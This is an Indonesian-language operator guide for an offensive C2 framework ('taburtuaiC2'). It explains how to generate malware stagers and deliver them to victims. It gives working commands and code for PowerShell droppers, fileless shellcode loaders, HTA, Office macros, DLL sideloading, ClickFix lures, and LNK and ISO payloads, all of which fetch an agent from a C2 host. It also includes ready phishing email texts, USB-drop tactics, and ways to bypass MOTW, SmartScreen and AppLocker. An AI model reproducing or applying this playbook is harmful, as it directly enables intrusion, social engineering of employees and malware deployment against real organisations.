# Delivery Guide — Panduan Per Format Stager

**taburtuaiC2** · Bahasa: Indonesia

> Dokumen ini fokus ke **cara mengirimkan setiap format stager ke target** — mulai dari
> generate sampai target eksekusi. Baca ini kalau kamu sudah paham konsep staged delivery
> dan mau langsung tahu cara kerja tiap metode.
>
> Untuk konsep dan arsitektur, lihat [STAGED_DELIVERY.md](STAGED_DELIVERY.md).

---

## Daftar Isi

| # | Format / Metode |
|---|---|
| — | [Prasyarat Umum](#prasyarat-umum) |
| 1 | [ps1 — PowerShell Drop](#1-ps1--powershell-drop) |
| 2 | [ps1-mem — PowerShell In-Memory](#2-ps1-mem--powershell-in-memory) |
| 3 | [exe — Binary Stager](#3-exe--binary-stager) |
| 4 | [hta — HTML Application](#4-hta--html-application) |
| 5 | [vba — Office Macro](#5-vba--office-macro) |
| 6 | [cs — C# Source Shellcode Runner](#6-cs--c-source-shellcode-runner) |
| 7 | [shellcode — Raw Shellcode Binary](#7-shellcode--raw-shellcode-binary) |
| 8 | [dll — DLL Sideloading](#8-dll--dll-sideloading) |
| 9 | [ClickFix — Social Engineering Lure](#9-clickfix--social-engineering-lure) |
| 10 | [LNK — Windows Shortcut](#10-lnk--windows-shortcut) |
| 11 | [ISO — Disk Image Bundle](#11-iso--disk-image-bundle) |
| — | [Tabel Perbandingan Cepat](#tabel-perbandingan-cepat) |

---

## Prasyarat Umum

Setiap format membutuhkan langkah dasar ini. Jalankan **satu kali** sebelum beralih ke
format mana pun.

```bash
# 1. Server C2 harus sudah jalan
ENCRYPTION_KEY=MY_SECRET_KEY ./bin/server --port 8000

# 2. Agent sudah dikompilasi dengan konfigurasi yang sama
make agent-win-stealth \
  C2_SERVER=http://172.23.0.118:8000 \
  ENC_KEY=MY_SECRET_KEY \
  INTERVAL=60 \
  JITTER=30

# 3. Agent sudah diupload ke stage server → simpan TOKEN yang keluar
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --server http://172.23.0.118:8000 \
  --format exe \
  --arch amd64 \
  --ttl 48 \
  --desc "nama-engagement"

# Output:
#   Token    : 6a69a21a750af40e983cf257b3d2e4a9   ← SIMPAN INI
#   Stage URL: http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
```

> Kalau lupa token: `./bin/operator stage list --server http://172.23.0.118:8000`

---

## 1. `ps1` — PowerShell Drop

### Apa yang Dilakukan

Stager berupa file PowerShell (`.ps1`). Isinya: stager EXE yang di-encode base64. Saat
dijalankan, PS1 decode binary ke `%TEMP%\<random>.exe`, jalankan hidden, lalu binary itu
download agent dari C2.

### Kapan Dipakai

- Phishing email dengan attachment PS1
- ClickFix / Win+R lure
- Shortcut (LNK) yang memanggil powershell
- Remote execution via WinRM / PSRemoting yang sudah kamu miliki
- Lab testing (paling mudah di-debug)

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format ps1 \
  --exec-method drop \
  --output stager.ps1
```

> Ganti `--exec-method drop` dengan `hollow` untuk execution yang lebih stealth
> (agent jalan di dalam proses svchost.exe, bukan proses baru).

### Delivery dan Cara Eksekusi

#### A — Langsung di terminal target (lab/test)

```powershell
powershell -ExecutionPolicy Bypass -File .\stager.ps1
```

#### B — Encode ke one-liner (untuk paste di Run dialog atau phishing)

Jalankan di mesin attacker:

```powershell
# Encode PS1 ke base64 untuk dijadikan one-liner
$bytes = [System.IO.File]::ReadAllBytes("stager.ps1")
$b64   = [System.Convert]::ToBase64String($bytes)
$cmd   = "powershell -w hidden -ep bypass -enc $b64"
Write-Host $cmd
```

Hasilnya adalah satu baris panjang yang bisa:
- Dipaste ke Run dialog (Win+R)
- Ditaruh sebagai perintah di ClickFix lure
- Dipaste di terminal target yang sudah kamu miliki akses

#### C — Via WinRM / PSRemoting

```powershell
# Dari mesin attacker ke target yang sudah ada kredensialnya
$cred = Get-Credential
$s    = New-PSSession -ComputerName 192.168.1.50 -Credential $cred
Invoke-Command -Session $s -ScriptBlock {
    $bytes = [Convert]::FromBase64String('PASTE_BASE64_DISINI')
    $tmp   = [IO.Path]::GetTempFileName() + '.ps1'
    [IO.File]::WriteAllBytes($tmp, $bytes)
    Start-Process powershell -ArgumentList "-ep bypass -f $tmp" -WindowStyle Hidden
}
```

#### D — Phishing email attachment

Kirim `stager.ps1` sebagai lampiran. Subject dan body lure contoh:

```
From: helpdesk@corp-update.com
Subject: [ACTION REQUIRED] Security patch deployment - please run attached script

Dear [Name],

Our IT department is deploying a critical security update to all workstations.
Please run the attached PowerShell script to apply the patch.

Right-click stager.ps1 → Run with PowerShell

If you receive an "Execution Policy" warning, click "Open" to proceed.
```

> **Catatan OPSEC:** Banyak email gateway blokir `.ps1`. Pertimbangkan zip+password,
> rename ke `.txt` disertai instruksi manual, atau format HTA/VBA sebagai alternatif.

### Yang Dilihat Target

Tidak ada jendela muncul. Proses `powershell.exe` singkat di task manager, lalu setelah
agent download selesai, proses baru muncul sesuai exec-method yang dipilih.

---

## 2. `ps1-mem` — PowerShell In-Memory

### Apa yang Dilakukan

PS1 download **raw shellcode** (bukan EXE) langsung ke memori via:
1. `VirtualAlloc(RWX)` — alokasi memori executable
2. `Marshal.Copy` — copy shellcode ke memori
3. `CreateThread` — eksekusi shellcode

Tidak ada file yang ditulis ke disk sama sekali (benar-benar fileless).

### Kapan Dipakai

- Target punya AV yang agresif scan file di disk
- Butuh benar-benar fileless — tidak ada artefak di disk
- Untuk bypass file-based detection

### Persiapan Khusus

`ps1-mem` butuh payload berupa **shellcode** (`.bin`), bukan EXE. Stage yang diupload
harus shellcode.

```bash
# Opsi 1: Pakai donut (konversi EXE → shellcode)
donut -i bin/agent_windows_stealth.exe -o agent.bin -a 2 -e 3

# Opsi 2: Pakai sRDI (Shellcode Reflective DLL Injection)
python sRDI/ConvertToShellcode.py bin/agent_windows_stealth.exe

# Upload shellcode sebagai stage (BUKAN EXE)
./bin/operator stage upload agent.bin \
  --server http://172.23.0.118:8000 \
  --format shellcode \
  --arch amd64 \
  --ttl 24 \
  --desc "shellcode stage"

# Catat TOKEN yang keluar dari upload ini (berbeda dengan token EXE sebelumnya)
```

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN_DARI_SHELLCODE_STAGE \
  --key MY_SECRET_KEY \
  --format ps1-mem \
  --output stager_mem.ps1
```

### Delivery dan Cara Eksekusi

Cara delivery sama dengan `ps1` biasa:

```powershell
# Langsung
powershell -ep bypass -f stager_mem.ps1

# One-liner encoded
$bytes = [IO.File]::ReadAllBytes("stager_mem.ps1")
$b64   = [Convert]::ToBase64String($bytes)
powershell -w hidden -ep bypass -enc $b64
```

### Perbedaan dari `ps1` Biasa

| | `ps1` (drop) | `ps1-mem` |
|---|---|---|
| Tulis ke disk | Ya (`%TEMP%\*.exe`) | Tidak sama sekali |
| Butuh jenis stage | EXE | Shellcode |
| Ketahanan vs AV disk scan | Medium | Tinggi |
| Ketahanan vs memory scan | Medium | Medium-Rendah (RWX memory flagged) |
| Kompleksitas setup | Rendah | Tinggi (butuh donut/sRDI) |

---

## 3. `exe` — Binary Stager

### Apa yang Dilakukan

Stager dikompilasi sebagai Windows EXE. Saat dijalankan langsung download agent dari C2
dan eksekusi. Tidak ada interpreter (PowerShell/VBScript) yang diperlukan.

### Kapan Dipakai

- Lab testing dan internal red team
- USB drop ke target yang tidak aware
- Delivery via file share atau network share internal
- Situasi di mana PowerShell diblokir policy

### Generate

```bash
# Drop method (paling simpel)
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format exe \
  --exec-method drop \
  --output stager.exe

# Hollow method (lebih stealth — agent jalan di svchost.exe)
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format exe \
  --exec-method hollow \
  --hollow-exe "C:\Windows\System32\RuntimeBroker.exe" \
  --output stager_hollow.exe
```

### Delivery dan Cara Eksekusi

#### A — Langsung (lab)

```
Double-click stager.exe
```
atau
```cmd
.\stager.exe
```

#### B — USB Drop

1. Copy `stager.exe` ke USB. Rename jadi sesuatu yang menarik:
   - `Chrome_Update_v126.exe`
   - `VPN_Config_Tool.exe`
   - `HR_Policy_2026.exe` _(tidak disarankan untuk non-test)_

2. Tinggalkan USB di area target (parkiran, lobby, meja konferensi)

3. Tunggu agent callback

#### C — Phishing dengan file executable

Lewat email, link download, atau file share. Perlu bypass SmartScreen:
- Sign binary dengan sertifikat code signing (self-signed biasanya dicurigai)
- Deliver dalam arsip `.zip` dengan password (bypass attachment scanning)
- Deliver via Google Drive / OneDrive link (bypass email gateway)

#### D — SMB / file share internal (lateral movement)

```cmd
# Kalau sudah punya akses ke network share target
copy stager.exe \\TARGET\C$\Users\Public\stager.exe
# Kemudian eksekusi via WMI atau SCM
wmic /node:TARGET process call create "C:\Users\Public\stager.exe"
```

---

## 4. `hta` — HTML Application

### Apa yang Dilakukan

File `.hta` adalah HTML dengan kemampuan VBScript/JScript. Windows membukanya dengan
`mshta.exe` — binary Microsoft yang signed dan trusted. HTA bisa jalankan program tanpa
UAC prompt untuk proses tertentu.

VBScript di dalam HTA memanggil `WScript.Shell.Run` untuk eksekusi PowerShell hidden
yang menjalankan stager.

### Kapan Dipakai

- Phishing email attachment (rename agar tidak mencurigakan)
- Fake "browser update" page yang target buka lewat browser
- Delivery via link yang dibuka di IE atau Edge (Legacy)
- LOLBin abuse — `mshta.exe` sering diizinkan di environment korporat

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format hta \
  --output update.hta
```

### Delivery dan Cara Eksekusi

#### A — Double-click (file attachment)

Target double-click `update.hta`. Windows tanya konfirmasi (`Run`), kalau di-klik maka
VBScript jalan dan stager dieksekusi.

> SmartScreen di Windows 10/11 menampilkan warning untuk `.hta` dari internet.
> Kalau didownload, perlu "More Info → Run Anyway" atau dibuka dari non-internet zone.

#### B — Via command line (no dialog)

```cmd
mshta.exe C:\path\to\update.hta
mshta.exe \\share\update.hta
```

Atau eksekusi dari URL (HTA remote — works di IE):
```
mshta.exe http://172.23.0.118:8888/update.hta
```

#### C — Via email attachment

```
From: it-security@company-updates.net
Subject: [URGENT] Browser Security Certificate Update Required

Your browser's security certificate needs to be renewed to maintain secure access
to company resources.

Please open the attached file (update.hta) and click "Run" when prompted.

This process takes less than 30 seconds.
```

#### D — Host di web server

```bash
# Di mesin attacker
python -m http.server 8888

# Target diberi link:
# http://172.23.0.118:8888/update.hta
# Browser akan download → target buka dari Downloads
```

#### E — Embed di ClickFix

```bash
go run ./cmd/generate template clickfix \
  --stager-file update.hta \
  --lure "Browser Certificate Verification" \
  --output lure.html
```

---

## 5. `vba` — Office Macro

### Apa yang Dilakukan

Macro VBA untuk Word/Excel. Saat dokumen dibuka dan target klik "Enable Content", macro:
1. Buat request HTTP ke stage URL via `MSXML2.XMLHTTP`
2. Download agent EXE ke `%TEMP%\upd<HHMMSS>.exe`
3. Eksekusi via `WScript.Shell.Run` (hidden, window=0)

### Kapan Dipakai

- Phishing via dokumen Office (classic dan masih efektif)
- Target yang bekerja di environment Office-heavy (finance, HR, legal)
- Spear phishing dengan dokumen yang relevan dengan role target

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format vba \
  --output macro.bas
```

### Deploy Macro ke Dokumen Office

#### Opsi A — Word Document (.docm)

1. Buka Microsoft Word → buat dokumen baru
2. Tambah konten yang relevan (invoice, contract, HR policy, dll.)
3. Tekan `Alt + F11` → VBA Editor terbuka
4. Di panel kiri, right-click nama project → **Insert → Module**
5. Paste seluruh isi `macro.bas`
6. Tutup VBA Editor
7. **File → Save As → Word Macro-Enabled Document (.docm)**
8. Kirim ke target

#### Opsi B — Excel Workbook (.xlsm)

Sama dengan Word tapi:
- Buat spreadsheet yang relevan
- Auto_Open / Workbook_Open jalan otomatis saat file dibuka
- Save as `.xlsm`

#### Opsi C — Embed di template (.dotm / .xltm)

Bisa dipakai sebagai template yang terinstall — macro jalan setiap kali template dipakai.

### Cara Eksekusi di Target

Target membuka dokumen. Office tampilkan security bar kuning:

```
SECURITY WARNING: Macros have been disabled.   [Enable Content]
```

Target klik **Enable Content** → macro `Document_Open()` / `Workbook_Open()` / `Auto_Open()`
otomatis terpanggil → agent didownload dan dieksekusi.

### Social Engineering untuk Enable Content

Tambahkan pesan di dokumen (sebelum macro jalan, dokumen terlihat kosong/blur):

```
[!] This document is protected. To view the content, please click
    "Enable Content" in the security bar above.
    
    This document uses macros to render properly.
```

Atau buat dokumen terlihat blurry/corrupt dan minta enable content untuk "fix" tampilan.

### Keterbatasan

| Keterbatasan | Penjelasan |
|---|---|
| Office Protected View | Dokumen dari internet dibuka di Protected View — macro tidak bisa jalan. Target harus klik "Enable Editing" dulu, baru "Enable Content". |
| MOTW (Mark of the Web) | File yang didownload dari internet punya MOTW. Cara bypass: deliver via ZIP (zip file tidak propagate MOTW ke isi), atau via SMB share. |
| AMSI di Office 365 | Office 365 modern punya AMSI scan untuk VBA. Macro bisa dideteksi sebelum jalan. |

**Bypass MOTW via ZIP:**
```bash
# Di Linux/macOS
zip -j delivery.zip macro-enabled-invoice.docm

# Di Windows
Compress-Archive macro-enabled-invoice.docm delivery.zip
```

---

## 6. `cs` — C# Source Shellcode Runner

### Apa yang Dilakukan

Generate source code C# yang download shellcode dari C2 dan eksekusi via PInvoke
(`VirtualAlloc + CreateThread`). Harus dikompilasi dulu sebelum dikirim ke target,
atau bisa dikompilasi di target menggunakan `csc.exe` yang sudah ada di Windows.

### Kapan Dipakai

- Target punya .NET Framework tapi PowerShell diblokir
- Ingin binary yang lebih susah di-reverse daripada PS1
- Perlu custom loader yang bisa dimodifikasi lebih lanjut
- LOLBin compile via `msbuild.exe` atau `csc.exe` untuk bypass applocker

### Persiapan Khusus

Sama dengan `ps1-mem` — stage yang diupload harus shellcode, bukan EXE.

```bash
# Convert EXE → shellcode
donut -i bin/agent_windows_stealth.exe -o agent.bin -a 2

# Upload shellcode
./bin/operator stage upload agent.bin \
  --server http://172.23.0.118:8000 \
  --format shellcode \
  --arch amd64 \
  --ttl 24
```

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN_SHELLCODE_STAGE \
  --key MY_SECRET_KEY \
  --format cs \
  --output stager.cs
```

### Delivery dan Cara Eksekusi

#### Opsi A — Kompilasi di mesin attacker, kirim EXE

```bash
# Di Windows mesin attacker (butuh .NET SDK atau csc.exe)
csc /unsafe /out:stager_cs.exe stager.cs

# Kirim stager_cs.exe ke target, jalankan seperti EXE biasa
```

#### Opsi B — Kompilasi di target via csc.exe (LOLBin)

`csc.exe` ada di setiap Windows yang punya .NET Framework. Tidak perlu Visual Studio.

```powershell
# Copy stager.cs ke target dulu, lalu:
$csc = (Get-ChildItem "C:\Windows\Microsoft.NET\Framework64" -Filter "csc.exe" -Recurse | Select -Last 1).FullName
& $csc /unsafe /out:$env:TEMP\s.exe C:\path\to\stager.cs
& "$env:TEMP\s.exe"
```

#### Opsi C — Eksekusi via msbuild.exe (bypass AppLocker)

Buat file `.csproj` yang trigger eksekusi:

```xml
<!-- stager.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RunStager">
    <MSBuild Projects="stager.csproj" />
  </Target>
  <UsingTask TaskName="Inline" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          /* Paste isi stager.cs di sini, dalam class yang tepat */
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe stager.csproj /t:RunStager
```

---

## 7. `shellcode` — Raw Shellcode Binary

### Apa yang Dilakukan

Konversi stager EXE ke raw shellcode (`.bin`) menggunakan pe2shellcode / sRDI. Output
berupa bytes yang bisa langsung dieksekusi sebagai machine code — tidak ada PE header,
tidak ada import table.

### Kapan Dipakai

- Inject ke proses lain yang sudah berjalan (process injection)
- Sebagai payload untuk BOF (Beacon Object File) loader
- Embed ke custom loader C/C++
- Input untuk tool injection lain (Cobalt Strike, custom injector)

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format shellcode \
  --output stager.bin
```

### Delivery dan Cara Eksekusi

Shellcode tidak bisa langsung dieksekusi — butuh loader. Beberapa cara:

#### Opsi A — Inject ke proses via operator (setelah ada agent lain)

Kalau sudah punya satu agent aktif, inject shellcode ke proses baru:

```bash
# Lihat proses yang bisa diinjeksi
./bin/operator ps list AGENT_ID --server http://172.23.0.118:8000

# Inject ke PID tertentu
./bin/operator inject remote AGENT_ID \
  --pid 1234 \
  --shellcode stager.bin \
  --server http://172.23.0.118:8000
```

#### Opsi B — PowerShell loader manual

```powershell
$sc  = [IO.File]::ReadAllBytes("stager.bin")
$sig = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr p,IntPtr r,uint c,IntPtr t);
[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h, int ms);
"@
$k  = Add-Type -MemberDefinition $sig -Name K -Namespace W -PassThru
$m  = $k::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
[Runtime.InteropServices.Marshal]::Copy($sc, 0, $m, $sc.Length)
$t  = $k::CreateThread([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$k::WaitForSingleObject($t, -1)
```

#### Opsi C — Embed di loader C

```c
#include <windows.h>
#include <stdio.h>

int main() {
    FILE *f = fopen("stager.bin", "rb");
    fseek(f, 0, SEEK_END); size_t sz = ftell(f); rewind(f);
    unsigned char *sc = malloc(sz);
    fread(sc, 1, sz, f); fclose(f);

    void *mem = VirtualAlloc(NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, sz);
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    return 0;
}
```

---

## 8. `dll` — DLL Sideloading

### Apa yang Dilakukan

Kompilasi stager sebagai DLL Windows. Stager dieksekusi dari `DllMain` saat DLL di-load
oleh proses manapun. Teknik ini memanfaatkan aplikasi legitimate yang memuat DLL dari
direktori yang bisa ditulis (DLL Search Order Hijacking).

### Kapan Dipakai

- DLL hijacking pada aplikasi yang diketahui vulnerable
- Persistence via replace DLL di folder aplikasi
- Bypass AppLocker yang izinkan DLL dari lokasi tertentu
- Execution dari proses legitimate (Outlook, Teams, Chrome)

### Persiapan Khusus

Butuh `mingw-w64` atau cross-compiler untuk build DLL dari Linux:

```bash
# Install di Ubuntu/Debian
sudo apt install gcc-mingw-w64-x86-64

# Atau gunakan Windows dengan MinGW
```

### Generate

```bash
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token 6a69a21a750af40e983cf257b3d2e4a9 \
  --key MY_SECRET_KEY \
  --format dll \
  --arch amd64 \
  --output version.dll
```

### Delivery dan Cara Eksekusi

#### Langkah 1 — Temukan target aplikasi yang vulnerable

Cari aplikasi di sistem target yang load DLL dari direktori yang sama dengan EXE-nya
(bukan dari `System32`). Tools yang berguna:

```powershell
# Procmon (Sysinternals) — filter: Result = NAME NOT FOUND, Path ends with .dll
# Process Hacker — lihat DLL yang di-load proses
# ProcDOT — visualisasi

# Contoh target yang diketahui DLL hijackable:
# - Microsoft Teams → version.dll
# - Zoom → dbghelp.dll
# - OneDrive → cryptbase.dll
# - Python → msimg32.dll
# - 7-Zip → version.dll
```

#### Langkah 2 — Rename DLL sesuai target

```bash
# Kalau target adalah Teams yang load version.dll
cp version.dll version.dll   # sudah namanya
# Kalau target load dbghelp.dll
cp version.dll dbghelp.dll
```

#### Langkah 3 — Tempatkan DLL di direktori yang tepat

```powershell
# Contoh: Teams load version.dll dari direktorinya sendiri
$teamsDir = "$env:LOCALAPPDATA\Microsoft\Teams\current"
Copy-Item version.dll "$teamsDir\version.dll"

# Saat Teams dijalankan lagi → DllMain terpanggil → agent dieksekusi
```

#### Langkah 4 — Trigger eksekusi

```powershell
# Cara 1: Tunggu user buka aplikasinya
# Cara 2: Restart aplikasi dari jarak jauh
Stop-Process -Name "Teams" -Force
Start-Process "$env:LOCALAPPDATA\Microsoft\Teams\current\Teams.exe"
```

---

## 9. ClickFix — Social Engineering Lure

### Apa yang Dilakukan

Halaman HTML yang tampak seperti error browser atau CAPTCHA. Target diminta melakukan
verifikasi dengan menekan Win+R dan mempaste perintah. Perintah sudah otomatis ter-copy
ke clipboard saat tombol diklik.

### Kapan Dipakai

- Initial access tanpa eksploitasi teknis
- Target tidak suspicious terhadap perintah yang "diberikan website"
- Cocok saat PowerShell tidak bisa di-deliver via attachment (email gateway blokir)
- Kombinasi dengan phishing link via email/WhatsApp/Teams

### Generate

```bash
# Opsi A — Embed stager langsung (tidak butuh akses ke C2)
go run ./cmd/generate template \
  --type clickfix \
  --stager-file bin/agent_windows_stealth.exe \
  --lure "Human Verification Required" \
  --output lure.html

# Opsi B — Link ke stage URL (file HTML lebih kecil, butuh C2 online)
go run ./cmd/generate template \
  --type clickfix \
  --url http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9 \
  --lure "Browser Security Verification" \
  --output lure.html
```

### Delivery

#### Opsi A — Host di web server

```bash
# Di mesin attacker
python -m http.server 80
# atau
caddy file-server --browse --root .

# Target diberi link: http://172.23.0.118/lure.html
```

Link dikirim via:
- Email ("Klik untuk review dokumen ini")
- WhatsApp / Teams / Slack
- QR code di physical phishing (USB, meja)

#### Opsi B — Host di platform gratis (lebih convincing)

Untuk domain yang lebih legitimate:
```
GitHub Pages : username.github.io/verification
Netlify      : random-name.netlify.app
Vercel       : random-name.vercel.app
Cloudflare   : gunakan redirect ke server kamu
```

> **OPSEC:** Jangan host payload langsung di platform pihak ketiga — hanya halaman HTML
> lure. Payload tetap dari C2 server kamu.

### Yang Dilihat Target

```
┌─────────────────────────────────────────┐
│  🔒  Human Verification Required        │
│                                         │
│  To verify you are human, please:       │
│                                         │
│  1. Press Windows key + R               │
│  2. Click the command below to copy it  │
│  3. Paste it in Run dialog, press Enter │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │ powershell -w hidden -ep bypass │    │
│  │ -enc BASE64PAYLOAD...           │    │
│  └─────────────────────────────────┘    │
│  [ 📋 Copy Command ]                    │
│                                         │
│  This verification expires in 5 min.   │
└─────────────────────────────────────────┘
```

Target tekan Win+R → paste → Enter → tidak ada yang terlihat → agent jalan background.

---

## 10. `lnk` — Windows Shortcut

### Apa yang Dilakukan

File `.lnk` (Windows Shortcut) yang isi targetnya bukan aplikasi biasa, melainkan
`cmd.exe` dengan argumen yang panggil PowerShell untuk download dan jalankan stager.
Terlihat seperti shortcut PDF, Word, atau folder biasa.

### Kapan Dipakai

- Delivery via USB (victim double-click shortcut yang kira file biasa)
- Delivery dalam arsip ZIP (LNK tidak kena MOTW kalau extract dari ZIP)
- Phishing via ISO yang berisi LNK + payload
- Persistence via folder Startup

### Generate

```bash
# Generate script PS1 yang membuat file LNK
go run ./cmd/generate template \
  --type lnk \
  --url http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9 \
  --lure "Laporan_Keuangan_Q1_2026" \
  --output make_lnk.ps1
```

### Buat File LNK

```powershell
# Jalankan di mesin attacker (Windows) atau di lingkungan Windows lab
powershell -f make_lnk.ps1
# Hasilnya: Laporan_Keuangan_Q1_2026.lnk di desktop
```

### Kustomisasi Ikon

Supaya LNK terlihat seperti file PDF atau Word:

```powershell
# Edit make_lnk.ps1 — ganti baris IconLocation:
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"      # generic document
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\WINWORD.EXE,0"  # Word
$lnk.IconLocation = "%ProgramFiles%\Adobe\Acrobat DC\Acrobat\Acrobat.exe,0"       # PDF
```

### Delivery

#### Opsi A — Via USB

1. Buat LNK di mesin attacker
2. Copy ke USB bersama file-file decoy (folder kosong, README palsu, dll.)
3. Tinggalkan USB di area target

#### Opsi B — Via ZIP tanpa MOTW

```powershell
# Di mesin attacker
Compress-Archive "Laporan_Keuangan_Q1_2026.lnk" "Laporan_Q1.zip"
# Kirim Laporan_Q1.zip via email → target extract → LNK tidak kena MOTW
```

#### Opsi C — Via ISO (lihat [Section 11](#11-iso--disk-image-bundle))

---

## 11. `iso` — Disk Image Bundle

### Apa yang Dilakukan

ISO yang berisi LNK dan payload. Saat ISO di-mount (double-click di Windows 10+),
tampak seperti CD/DVD drive. Target double-click LNK di dalamnya → stager jalan.

File dalam ISO **tidak kena MOTW** karena ISO di-mount sebagai drive virtual —
bukan file biasa dari internet.

### Kapan Dipakai

- Phishing email attachment (ISO besar tapi legitimate-looking)
- Bypass MOTW — konten ISO tidak kena SmartScreen / Mark of the Web
- Delivery malware yang lebih kompleks (banyak file pendukung)

### Generate Resep ISO

```bash
go run ./cmd/generate template \
  --type iso \
  --url http://172.23.0.118:8000/stage/6a69a21a750af40e983cf257b3d2e4a9 \
  --lure "Dokumen_Kontrak_2026" \
  --output iso_recipe.txt

# Baca iso_recipe.txt untuk instruksi lengkap
```

### Buat ISO

```bash
# ─── Di mesin Linux (attacker) ─────────────────────────────────────────────
# Struktur direktori
mkdir -p iso_contents
cp stager.exe iso_contents/
# Buat LNK (butuh tools atau script)
# Buat autorun.inf (opsional, hanya efektif di Windows XP/2003)
cat > iso_contents/autorun.inf << 'EOF'
[AutoRun]
open=stager.exe
icon=stager.exe,0
EOF

# Build ISO
mkisofs -o Dokumen_Kontrak_2026.iso -J -R -l iso_contents/

# ─── Di mesin Windows (attacker) ────────────────────────────────────────────
# Butuh Windows ADK (oscdimg) atau ImgBurn
# Install Windows ADK: https://docs.microsoft.com/en-us/windows-hardware/get-started/adk-install
oscdimg -n -m iso_contents/ Dokumen_Kontrak_2026.iso
```

### Isi Direktori ISO yang Ideal

```
Dokumen_Kontrak_2026.iso
└── (mounted sebagai drive D:)
    ├── Dokumen_Kontrak_2026.lnk     ← target double-click ini
    ├── autorun.inf                   ← auto-open (Windows XP only)
    └── ~doc.pdf                      ← decoy file (buka PDF asli setelah payload jalan)
```

### Delivery

Kirim `Dokumen_Kontrak_2026.iso` via:
- Email attachment (beberapa gateway blokir ISO — coba rename ke `.img`)
- WeTransfer / Google Drive / OneDrive link
- USB

### Yang Dilakukan Target

1. Terima email: "Terlampir dokumen kontrak yang perlu ditinjau"
2. Download dan double-click `.iso`
3. Windows mount ISO sebagai drive (misal D:)
4. Explorer terbuka, terlihat isi "CD"
5. Double-click `Dokumen_Kontrak_2026.lnk`
6. Stager jalan, agent connect ke C2

---

## Tabel Perbandingan Cepat

| Format | Ekstensi | Butuh PowerShell | Tulis ke Disk | Detection Risk | Kompleksitas Setup |
|---|---|---|---|---|---|
| `ps1` | `.ps1` | Ya | Ya (`%TEMP%`) | Medium | Rendah |
| `ps1-mem` | `.ps1` | Ya | Tidak | Medium-Tinggi | Tinggi (butuh shellcode) |
| `exe` | `.exe` | Tidak | Ya (`%TEMP%`) | Medium | Rendah |
| `hta` | `.hta` | Tidak langsung | Ya (`%TEMP%`) | Medium | Rendah |
| `vba` | `.bas/.docm` | Tidak | Ya (`%TEMP%`) | Medium-Tinggi | Medium |
| `cs` | `.cs/.exe` | Tidak | Tergantung opsi | Rendah | Tinggi |
| `shellcode` | `.bin` | Tidak | Tidak | Rendah-Medium | Tinggi |
| `dll` | `.dll` | Tidak | Ya | Rendah | Tinggi |

| Delivery Method | File Yang Dikirim | Interaksi Target | MOTW Risk |
|---|---|---|---|
| Email PS1 | `.ps1` | Klik "Run" | Ya |
| ClickFix (Win+R) | HTML lure | Paste + Enter | Tidak |
| HTA | `.hta` | Double-click | Ya |
| Office Macro | `.docm/.xlsm` | Enable Content | Ya |
| USB Drop (EXE) | `.exe` | Double-click | Tidak |
| LNK via ZIP | `.zip` → `.lnk` | Extract + click | Tidak |
| ISO | `.iso` → `.lnk` | Mount + click | Tidak |

### Decision Tree — Pilih Format Berdasarkan Situasi

```
Apakah sudah punya akses shell ke target?
├── YA  → Langsung kirim ps1 atau jalankan one-liner
└── TIDAK (butuh initial access)
    │
    ├── Delivery via email attachment?
    │   ├── Target buka Office → vba (macro)
    │   ├── Target buka semua file → hta atau exe dalam zip
    │   └── Gateway blokir ekstensi → iso atau lnk dalam zip
    │
    ├── Delivery via link (phishing web)?
    │   ├── Target Windows 10/11 modern → ClickFix
    │   └── Target lebih lama → hta via link
    │
    ├── Delivery fisik (USB)?
    │   └── exe atau iso dengan lnk
    │
    └── Target punya AV/EDR aktif?
        ├── AV saja → ps1 dengan exec-method hollow
        ├── EDR aktif → dll sideloading atau ps1-mem
        └── EDR + memory scan → butuh custom loader terpisah
```

---

*Untuk konsep dan arsitektur staged delivery, lihat [STAGED_DELIVERY.md](STAGED_DELIVERY.md).*

*Untuk referensi teknis OPSEC dan evasion, lihat [WIKI.md](WIKI.md).*
